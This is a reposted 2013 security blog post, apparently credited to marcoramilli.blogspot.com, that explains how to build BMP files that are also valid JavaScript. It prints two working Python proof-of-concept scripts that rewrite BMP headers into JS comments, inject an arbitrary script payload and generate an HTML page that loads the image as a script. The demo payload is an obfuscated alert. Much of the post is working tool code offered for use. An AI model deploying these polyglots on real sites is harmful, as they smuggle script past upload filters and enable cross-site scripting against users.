title: "Hacking through images"
date: 2013-10-28 11:46:00
tags:
id: 347
comment: false
categories:
  - 学习笔记
---

<div>It's long time I don't write on my own blog (more then two months) and if you look at the history bar on your right you will probably figure out I am slowing down my blog posts a bit if compared to the past years. This happens due the amount of work my security team and I are involved on.</div>
<div></div>
<div>Many different and really important facts happened during the past months, from astonishing NSA revelations to huge BUGs and new Malware kit ready to be purchased. Even if there would be lots to say about all these I will not dig into them.</div>
<div></div>
<div>Since "things" went public today I want to share a little and dirty python script which embeds javascript code into bmp images letting those images still valid images, ready to be processed from your favorite browser.</div>
<div></div>
<div>The following HTML page wants to parse a bmp file and a javascript file which happen to be the same file: 2.bmp. Theoretically the file should be or a bitmap file or a javascript file. **Could it be a javacript and an image file at the same time** ? The answer should be NO. It couldn't. But let's see what we have.</div>
<div>[![1](http://lpcdma.com/wp-content/uploads/2013/10/1-300x77.png)](http://lpcdma.com/wp-content/uploads/2013/10/1.png)</div>
Executing this file you'll find out this result:

[![2](http://lpcdma.com/wp-content/uploads/2013/10/2-300x207.png)](http://lpcdma.com/wp-content/uploads/2013/10/2.png)

This is just my implementation of the BMP parsing bug many libraries have. The idea behind this python code is to create a valid BMP header within \x2F\x2A (aka \*) and then close up the end of the image through a \x2A\x2F (aka *\). To be a valid JavaScript file, you need to use the --not used-- header (\x42\x4D) as a variable and/or as a part of the code. This is why before the payload you might inject a simple expression like "=1;" or more commonly used "=a;" The following image shows the first part of a forget BMP header to exploit this eakness.

python bmp.py -i 2.bmp "var _0x9c4c=[\"\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x21\",\"\x0A\",\"\x4F\x4B\"];var a=_0x9c4c[0];function MsgBox(_0xccb4x3){alert(_0xccb4x3+_0x9c4c[1]+a);} ;MsgBox(_0x9c4c[2]);"

[![](http://lpcdma.com/wp-content/uploads/2013/10/1.bmp)
<script type="text/javascript" src="http://lpcdma.com/wp-content/uploads/2013/10/1.bmp"></script>
](http://lpcdma.com/wp-content/uploads/2013/10/1.bmp)
<pre class="brush:py">#!/usr/bin/env python2.7

import os
import argparse
def injectFile(payload,fname):
	f = open(fname,"r+b")
	b = f.read()
	f.close()
	f = open(fname,"w+b")
	f.write(b)
	f.seek(2,0)
	f.write(b'\x2F\x2A')
	f.close()
	f = open(fname,"a+b")
	f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
	f.write(payload)
	f.close()
	return True
if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("filename",help="the bmp file name to infected")
	parser.add_argument("js_payload",help="the payload to be injected. For exampe: \"alert(1);\"")
	args = parser.parse_args()
	injectFile(args.js_payload,args.filename)</pre>
来自：http://marcoramilli.blogspot.com/2013/10/hacking-through-images.html
<pre class="brush:py">#!/usr/bin/env python2

#============================================================================================================#

#======= Simply injects a JavaScript Payload into a BMP. ====================================================#

#======= The resulting BMP must be a valid (not corrupted) BMP. =============================================#

#======= Author: marcoramilli.blogspot.com ==================================================================#

#======= Version: PoC (don't even think to use it in development env.) ======================================#

#======= Disclaimer: ========================================================================================#

#THIS SOFTWARE IS PROVIDED BY THE AUTHOR "AS IS" AND ANY EXPRESS OR

#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED

#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE

#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,

#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES

#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR

                                                                #SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)

                                                                #HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,

#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING

#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE

#POSSIBILITY OF SUCH DAMAGE.

#===========================================================================================================#

import argparse

import os

#---------------------------------------------------------

def _hexify(num):

        """

        Converts and formats to hexadecimal

        """

        num = "%x" % num

        if len(num) % 2:

                num = '0'+num

        return num.decode('hex')

#---------------------------------------------------------

#Example payload: "var _0xe428=[\""+ b'\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64' + "\"]

#;alert(_0xe428[0]);"

def _generate_and_write_to_file(payload, fname):

        """

        Generates a fake but valid BMP within scriting

        """

        f = open(fname, "wb")

        header = (b'\x42\x4D'  #Signature BM

                                                b'\x2F\x2A\x00\x00' #Header File size, but encoded as /* &lt;-- Yes it's a valid header 

                                                b'\x00\x00\x00\x00' #Reserved

                                                b'\x00\x00\x00\x00' #bitmap data offset

                                                b''+ _hexify( len(payload) ) + #bitmap header size

                                          b'\x00\x00\x00\x14' #width 20pixel .. it's up to you

                                                b'\x00\x00\x00\x14' #height 20pixel .. it's up to you

                                          b'\x00\x00' #nb_plan  

                                                b'\x00\x00' #nb per pixel

                                                b'\x00\x10\x00\x00' #compression type

                                                b'\x00\x00\x00\x00' #image size .. its ignored

                                                b'\x00\x00\x00\x01' #Horizontal resolution

                                                b'\x00\x00\x00\x01' #Vertial resolution

                                                b'\x00\x00\x00\x00' #number of colors

                                                b'\x00\x00\x00\x00' #number important colors

                                                b'\x00\x00\x00\x80' #palet colors to be complient

                                                b'\x00\x80\xff\x80' #palet colors to be complient

                                                b'\x80\x00\xff\x2A' #palet colors to be complient

                                                b'\x2F\x3D\x31\x3B' #*/=1;

                                                )

        # I made this explicit, step by step .

        f.write(header)

        f.write(payload)

        f.close()

        return True

#---------------------------------------------------------

def _generate_launching_page(f):

        """

        Creates the HTML launching page

        """

        htmlpage ="""

                                                                &lt;html&gt;

                                                                &lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;

                                                                &lt;body&gt;

                                                                        &lt;img src=\"""" + f + """\"\&gt;

                                                                        &lt;script src= \"""" + f + """\"&gt; &lt;/script&gt;

                                                                &lt;/body&gt;

                                                                &lt;/html&gt;

                                                """

        html = open("run.html", "wb")

        html.write(htmlpage);

        html.close()

        return True

#---------------------------------------------------------

def _inject_into_file(payload, fname):

        """

        Injects the payload into existing BMP

        NOTE: if the BMP contains \xFF\x2A might caouse issues

        """

        # I know, I can do it all in memory and much more fast.

        # I wont do it here.

        f = open(fname, "r+b")

        b = f.read()

        b.replace(b'\x2A\x2F',b'\x00\x00')

        f.close()

        f = open(fname, "w+b")

        f.write(b)

        f.seek(2,0)

        f.write(b'\x2F\x2A')

        f.close()

        f = open(fname, "a+b")

        f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')

        f.write(payload)

        f.close()

        return True

#---------------------------------------------------------

if __name__ == "__main__":

        parser = argparse.ArgumentParser()

        parser.add_argument("filename",help="the bmp file name to be generated/or infected")

        parser.add_argument("js_payload",help="the payload to be injected. For exmample: \"alert(\"test\");\"")

        parser.add_argument("-i", "--inject-to-existing-bmp", action="store_true", help="inject into the current bitmap")

        args = parser.parse_args()

        print("""

                                        |======================================================================================================|

                                        | [!] legal disclaimer: usage of this tool for injecting malware to be propagated is illegal.          |

                                        | It is the end user's responsibility to obey all applicable local, state and federal laws.            |

                                        | Authors assume no liability and are not responsible for any misuse or damage caused by this program  |

                                        |======================================================================================================|

                                        """)

        if args.inject_to_existing_bmp:

                 _inject_into_file(args.js_payload, args.filename)

        else:

                _generate_and_write_to_file(args.js_payload, args.filename)

        _generate_launching_page(args.filename)

        print "[+] Finished!"</pre>